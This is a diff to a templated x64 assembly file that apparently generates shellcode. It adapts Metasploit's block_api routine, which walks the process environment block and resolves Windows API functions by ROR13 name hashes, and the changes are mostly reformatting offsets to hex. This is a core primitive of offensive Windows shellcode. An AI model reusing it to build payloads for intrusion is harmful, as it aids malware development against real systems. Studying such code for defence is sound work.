@@ -1,6 +1,7 @@
+{# https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm #}
 {% macro api_call(libname, funcname) -%}
 
-  mov r10d, {{ api_hash(libname, funcname) }}
+  mov r10d, {{ api_hash(libname, funcname) }}                                      ; r10d = api_hash('{{ libname }}', '{{ funcname }}')
   call rbp
 {%- endmacro %}
 ;-----------------------------------------------------------------------------;
@@ -17,12 +18,12 @@ api_call:
   push rcx                         ; Save the 1st parameter
   push rsi                         ; Save RSI
   xor rdx, rdx                     ; Zero rdx
-  mov rdx, gs:[rdx+96]             ; Get a pointer to the PEB
-  mov rdx, [rdx+24]                ; Get PEB->Ldr
-  mov rdx, [rdx+32]                ; Get the first module from the InMemoryOrder module list
+  mov rdx, gs:[rdx+0x60]           ; Get a pointer to the PEB
+  mov rdx, [rdx+0x18]              ; Get PEB->Ldr
+  mov rdx, [rdx+0x20]              ; Get the first module from the InMemoryOrder module list
 _blkapi_next_mod:                  ;
-  mov rsi, [rdx+80]                ; Get pointer to modules name (unicode string)
-  movzx cx, [rdx+74]               ; Set rcx to the length we want to check
+  mov rsi, [rdx+0x50]              ; Get pointer to modules name (unicode string)
+  movzx rcx, word ptr [rdx+0x4a]   ; Set rcx to the length we want to check
   xor r9, r9                       ; Clear r9 which will store the hash of the module name
 _blkapi_loop_modname:              ;
   xor rax, rax                     ; Clear rax
@@ -31,28 +32,28 @@ _blkapi_loop_modname:              ;
   jl _blkapi_not_lowercase         ;
   sub al, 0x20                     ; If so normalise to uppercase
 _blkapi_not_lowercase:             ;
-  ror r9d, 13                      ; Rotate right our hash value
+  ror r9d, 0xd                     ; Rotate right our hash value
   add r9d, eax                     ; Add the next byte of the name
   loop _blkapi_loop_modname        ; Loop until we have read enough
   ; We now have the module hash computed
   push rdx                         ; Save the current position in the module list for later
   push r9                          ; Save the current module hash for later
   ; Proceed to itterate the export address table,
-  mov rdx, [rdx+32]                ; Get this modules base address
-  mov eax, dword ptr [rdx+60]      ; Get PE header
+  mov rdx, [rdx+0x20]              ; Get this modules base address
+  mov eax, dword ptr [rdx+0x3c]    ; Get PE header
   add rax, rdx                     ; Add the modules base address
-  cmp word ptr [rax+24], 0x020B    ; is this module actually a PE64 executable?
+  cmp word ptr [rax+0x18], 0x020B  ; is this module actually a PE64 executable?
   ; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and
   ; their may be a PE32 module present in the PEB's module list, (typically the main module).
   ; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
   jne _blkapi_get_next_mod1        ; if not, proceed to the next module
-  mov eax, dword ptr [rax+136]     ; Get export tables RVA
+  mov eax, dword ptr [rax+0x88]    ; Get export tables RVA
   test rax, rax                    ; Test if no export address table is present
   jz _blkapi_get_next_mod1         ; If no EAT present, process the next module
   add rax, rdx                     ; Add the modules base address
   push rax                         ; Save the current modules EAT
-  mov ecx, dword ptr [rax+24]      ; Get the number of function names
-  mov r8d, dword ptr [rax+32]      ; Get the rva of the function names
+  mov ecx, dword ptr [rax+0x18]    ; Get the number of function names
+  mov r8d, dword ptr [rax+0x20]    ; Get the rva of the function names
   add r8, rdx                      ; Add the modules base address
   ; Computing the module hash + function hash
 _blkapi_get_next_func:             ;
@@ -65,7 +66,7 @@ _blkapi_get_next_func:             ;
 _blkapi_loop_funcname:             ;
   xor rax, rax                     ; Clear rax
   lodsb                            ; Read in the next byte of the ASCII function name
-  ror r9d, 13                      ; Rotate right our hash value
+  ror r9d, 0xd                     ; Rotate right our hash value
   add r9d, eax                     ; Add the next byte of the name
   cmp al, ah                       ; Compare AL (the next byte from the name) to AH (null)
   jne _blkapi_loop_funcname        ; If we have not reached the null terminator, continue
@@ -74,10 +75,10 @@ _blkapi_loop_funcname:             ;
   jnz _blkapi_get_next_func        ; Go compute the next function hash if we have not found it
   ; If found, fix up stack, call the function and then value else compute the next one...
   pop rax                          ; Restore the current modules EAT
-  mov r8d, dword ptr [rax+36]      ; Get the ordinal table rva
+  mov r8d, dword ptr [rax+0x24]    ; Get the ordinal table rva
   add r8, rdx                      ; Add the modules base address
   mov cx, [r8+2*rcx]               ; Get the desired functions ordinal
-  mov r8d, dword ptr [rax+28]      ; Get the function addresses table rva
+  mov r8d, dword ptr [rax+0x1c]    ; Get the function addresses table rva
   add r8, rdx                      ; Add the modules base address
   mov eax, dword ptr [r8+4*rcx]    ; Get the desired functions RVA
   add rax, rdx                     ; Add the modules base address to get the functions actual VA
@@ -91,7 +92,7 @@ _blkapi_finish:
   pop r8                           ; Restore the 3rd parameter
   pop r9                           ; Restore the 4th parameter
   pop r10                          ; pop off the return address
-  sub rsp, 32                      ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
+  sub rsp, 0x20                    ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                    ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
   push r10                         ; push back the return address
   jmp rax                          ; Jump into the required function
